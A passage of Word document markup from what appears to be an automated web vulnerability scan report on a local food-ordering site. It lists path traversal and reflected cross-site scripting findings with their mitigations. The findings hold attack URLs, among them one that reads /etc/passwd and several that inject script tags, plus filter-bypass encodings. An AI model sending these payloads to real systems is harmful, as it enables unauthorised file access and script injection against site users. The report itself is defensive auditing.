        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1898B581"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443E62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3802" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="286728E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79</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="79755172"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3577E75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3802" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="53F1AC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8</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6507C91F" w14:textId="77777777" w:rsidTr="007577DE">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1150" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="24C273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3802" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="52D233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bl>
    <w:p w14:paraId="76BB9F85"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7793CA51" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:trHeight w:val="360"/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="16E3BBC9" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:bookmarkStart w:id="76" w:name="high" w:colFirst="0" w:colLast="0"/>
            <w:r w:rsidRPr="00DA102C">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>High (Medium)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="39A7DB4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Path Traversal</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="56E6C304"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BC586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63D800E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Path Traversal attack technique allows an attacker access to files, directories, and commands that potentially reside outside the web document root directory. An attacker may manipulate a URL in such a way that the web site will execute or reveal the contents of arbitrary files anywhere on the web server. Any device that exposes an HTTP-based interface is potentially vulnerable to Path Traversal.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70A7A74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Most web sites restrict user access to a specific portion of the file-system, typically called the "web document root" or "CGI root" directory. These directories contain the files intended for user access and the executable necessary to drive web application functionality. To access files or execute commands anywhere on the file-system, Path Traversal attacks will utilize the ability of special-characters sequences.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6AC88D2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most basic Path Traversal attack uses the "../" special-character sequence to alter the resource location requested in the URL. Although most popular web servers will prevent this technique from escaping the web document root, alternate encodings of the "../" sequence may help bypass the security filters. These method variations include valid and invalid Unicode-encoding ("..%u2216" or "..%c0%af") of the forward slash character, backslash characters ("..\") on Windows-based servers, URL encoded characters "%2e%2e%2f"), and double URL encoding ("..%255c") of the backslash character.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2ADC0C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Even if the web server properly restricts Path Traversal attempts in the URL path, a web application itself may still be vulnerable due to improper handling of user-supplied input. This is a common problem of web applications that use template mechanisms or load static text from files. In variations of the attack, the original URL parameter value is substituted with the file name of one of the web application's dynamic scripts. Consequently, the results can reveal source code because the file is interpreted as text instead of an executable script. These techniques often employ additional special characters such as the dot (".") to reveal the listing of the current working directory, or "%00" NULL characters in order to bypass rudimentary file extension checks.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="07BC682F" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="2"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6DD461E4" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="41988E0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1F58C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417D6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http://192.168.1.20/attachment.php?type=%2Fetc%2Fpasswd</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2C77743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48E74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Method</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="380B81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94E5F7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DB348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61E069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type</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="16B593A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EB1CC5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15F944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/etc/passwd</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4E2656C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EED2B3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BA0428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root:x:0:0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7B8E773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FDB8F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152D07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r w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="02BC409E"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3802A2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06DD3A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Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="700E03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When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as "red" or "blue."</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="649ACB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filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses, and exclude directory separators such as "/". Use a whitelist of allowable file extensions.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="218198D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Warning: if you attempt to cleanse your data, then do so that the end result is not in the form that can be dangerous. A sanitizing mechanism can remove characters such as '.' and ';' which may be required for some exploits. An attacker can try to fool the sanitizing mechanism into "cleaning" data into a dangerous form. Suppose the attacker injects a '.' inside a filename (e.g. "sensi.tiveFile") and the sanitizing mechanism removes the character resulting in the valid filename, "sensitiveFile". If the input data are now assumed to be safe, then the file may be compromised.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03D1CF1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Inputs should be decoded and canonicalized to the application's current internal representation before being validated. Make sure that your application does not decode the same input twice. Such errors could be used to bypass whitelist schemes by introducing dangerous inputs after they have been checked.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="230294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Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes ".." sequences and symbolic links.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35124D9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Run your code using the lowest privileges that are required to accomplish the necessary tasks. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A3775A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When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5CA901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Run your code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by your software.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5ABD8EC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OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows you to specify restrictions on file operations.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="351BB35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This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="784C2A6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B0794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3CD378A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http://projects.webappsec.org/Path-Traversal</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17C8400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http://cwe.mitre.org/data/definitions/22.html</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="5CF2D17B"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D03623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25DAFB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22</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="487DF7B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A5B3E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497FD79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33</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="36EACCA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3962F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53BA8E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bl>
    <w:p w14:paraId="68B9B52C"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2270791C" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:trHeight w:val="360"/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3768540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High (Low)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="386C01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Cross Site Scripting (Reflected)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:bookmarkEnd w:id="76"/>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6FD8444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FE2DB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4D0D62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Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1585BDE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When an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46D2F34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There are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25CBB2A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Non-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12916B9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Persistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="56431C65" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="2"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="56C17219" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="39A32F2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7A53D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932B6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http://192.168.1.20/admin/update-exec.php?id=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="16E945D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454AE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FC3D5A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1E8DD7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E27E8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C16CDF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id</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4643006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D8407E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2D30DA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'"&lt;script&gt;alert(1);&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="521F60C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37482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7BABE3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'"&lt;script&gt;alert(1);&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7315711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8D0794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0C866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http://192.168.1.20/admin/delete-food.php?id=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="19C8CC1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8A195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9E4637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9CF60C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74930A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DDBF19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id</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="18CC6E5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3BFA9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6AD56D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'"&lt;script&gt;alert(1);&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1E4610A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5B0D2E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B9781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'"&lt;script&gt;alert(1);&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3B12D3C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0F984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F4CA99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http://192.168.1.20/admin/delete-special.php?id=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3DFA8D0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53817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A99811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18667A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000089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C55C57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id</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="21AE5BB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C43A6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5A44EF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'"&lt;script&gt;alert(1);&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="60A4E2B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90223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22AD7C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'"&lt;script&gt;alert(1);&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6BB0F9E1"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09A05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Instances</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1FCF385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r w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="5BA608DE"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F6F273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664175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Architecture and Design</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7837335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Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78B9DE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Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D9FC0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Phases: Implementation; Architecture and Design</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44AE96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Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78D4FD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any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E1FF36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Consult the XSS Prevention Cheat Sheet for more details on the types of encoding and escaping that are needed.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4AC8937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Architecture and Design</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0BCD79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any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64CDEF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If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B6D90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Implementation</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4557239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every web page that is generated, use and specify a character encoding such as ISO-8859-1 or UTF-8. When an encoding is not specified, the web browser may choose a different encoding by guessing which encoding is actually being used by the web page. This can cause the web browser to treat certain sequences as special, opening up the client to subtle XSS attacks. See CWE-116 for more mitigations related to encoding/escaping.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3AFD2B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To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D8535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Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A644E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When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as "red" or "blue."</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="151B841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that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="796C4B5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BAF09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550036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http://projects.webappsec.org/Cross-Site-Scripting</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0434D2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http://cwe.mitre.org/data/definitions/79.html</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4F0F1FE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A932F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0B802B7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79</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="5A17503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24703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4968F1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8</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="094C191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B6C623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Source ID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="180169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bl>
    <w:p w14:paraId="476AEC02"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6D313486" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:trHeight w:val="360"/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFA500"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6BECD719" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:bookmarkStart w:id="77" w:name="medium" w:colFirst="0" w:colLast="0"/>
            <w:r w:rsidRPr="00DA102C">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Medium (Medium)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFA500"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7804DA2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 Header Not Set</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3A11CE86"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3B8E15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36AA30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 header is not included in the HTTP response to protect against 'ClickJacking' attacks.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="45BE938B" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="2"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="582CB23C" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="19C4FC3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B2F1CF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97788B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http://192.168.1.20/images/pizza/?C=S;O=D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6AD0861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50DCA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D3023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A942EC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B48D6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5A15D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B3DA883"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1D2B20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B0573F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http://192.168.1.20/admin/allocation.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1480985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77679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72A155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5D4B2E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46152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4AA56E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1AE670B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BE06A1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B51C45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http://192.168.1.20/images/pizza/?C=D;O=D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
